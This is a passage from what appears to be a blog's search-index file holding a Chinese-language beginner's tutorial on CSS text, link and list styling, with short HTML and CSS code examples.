class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>文字-字体<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"5.css"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>这是一段字<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>hello world!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><h2 id="CSS-文本"><a href="#CSS-文本" class="headerlink" title="CSS - 文本"></a>CSS - 文本</h2><h4 id="文本属性集合"><a href="#文本属性集合" class="headerlink" title="文本属性集合"></a>文本属性集合</h4><ul><li><strong>color属性用于设置文本的颜色</strong></li><li><strong>direction属性用于设置文本方向。</strong></li><li><strong>letter-spacing属性用于在组成单词的字母之间添加或减去空格。</strong> </li><li><strong>text-indent属性用于缩进段落的文本。</strong></li><li><strong>text-align属性用于对齐文档的文本。</strong> </li><li><strong>text-decoration属性用于下划线，上划线和删除文本。</strong></li><li><strong>text-transform属性用于大写文本或将文本转换为大写或小写字母。</strong></li><li><strong>white-space属性用于控制文本的流和格式。</strong></li><li><strong>text-shadow属性用于设置文本周围的文本阴影。</strong></li></ul><h4 id="文本颜色："><a href="#文本颜色：" class="headerlink" title="文本颜色："></a>文本颜色：</h4><ul><li>十六进制值 - 如: <strong>＃FF0000</strong></li><li>一个RGB值 - 如: <strong>RGB(255,0,0)</strong>     ==不推荐使用太多浏览器不支持==</li><li>颜色的名称 - 如: <strong>red</strong></li></ul><div class="hljs"><pre><code class="hljs html">body &#123;color:red;&#125;h1 &#123;color:#00ff00;&#125;h2 &#123;color:rgb(255,0,0);&#125;</code></pre></div><h4 id="文本的对齐方式"><a href="#文本的对齐方式" class="headerlink" title="文本的对齐方式"></a>文本的对齐方式</h4><p>文本可居中或对齐到左或右,两端对齐.</p><div class="hljs"><pre><code class="hljs html">.a1&#123;text-align:right;&#125;.a2&#123;text-align:center;&#125;.a3&#123;text-align:left;&#125;</code></pre></div><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"a1"</span>&gt;</span>这是一段字<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"a2"</span>&gt;</span>hello world!<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"a3"</span>&gt;</span>hhhhaaaa<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></code></pre></div><h4 id="文本修饰"><a href="#文本修饰" class="headerlink" title="文本修饰"></a>文本修饰</h4><p>装饰文字，值为none（去掉修饰），underline，overline，line-through，blink。</p><div class="hljs"><pre><code class="hljs html">.a1&#123;text-decoration:overline;&#125;.a2&#123;text-decoration:line-through;&#125;.a3&#123;text-decoration:underline;&#125;</code></pre></div><h4 id="文本缩进"><a href="#文本缩进" class="headerlink" title="文本缩进"></a>文本缩进</h4><p>文本缩进属性是用来指定文本的第一行的缩进。</p><p><code>p {text-indent:50px;}</code></p><h4 id="文本方向"><a href="#文本方向" class="headerlink" title="文本方向"></a>文本方向</h4><p>值是ltr或rtl。</p><div class="hljs"><pre><code class="hljs html">.a&#123;  direction:rtl;   &#125;</code></pre></div><p>文字就先写到这。</p><h2 id="CSS-链接"><a href="#CSS-链接" class="headerlink" title="CSS 链接"></a>CSS 链接</h2><h4 id="链接样式"><a href="#链接样式" class="headerlink" title="链接样式"></a>链接样式</h4><ol><li><strong>a:link - 正常，未访问过的链接</strong></li><li><strong>a:visited - 用户已访问过的链接</strong></li><li><strong>a:hover - 当用户鼠标放在链接上时</strong></li><li><strong>a:active - 链接被点击的那一刻</strong></li></ol><p><code>a:link {color: red;}</code></p><h2 id="CSS列表"><a href="#CSS列表" class="headerlink" title="CSS列表"></a>CSS列表</h2><p>常用的就是</p><div class="hljs"><pre><code class="hljs html">ul&#123;    list-style-type: none;      list-style-type: disc;    实心圆    list-style-type: circle;    空心圆    list-style-type: square;      实心方格&#125;</code></pre></div><p>最常用就是 none 然后换成自己想弄成的图片。</p><p> ol 对应就是 <code>lower-alpha</code>  <code>upper-alpha</code> <code>lower-roman</code>等等；</p><p><strong>作为列表项标记的图像</strong></p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-string">ul</span>&#123;    <span class="hljs-built_in">list-style-image:</span> <span class="hljs-string">url(</span><span class="hljs-string">''</span>);&#125;</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>css</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
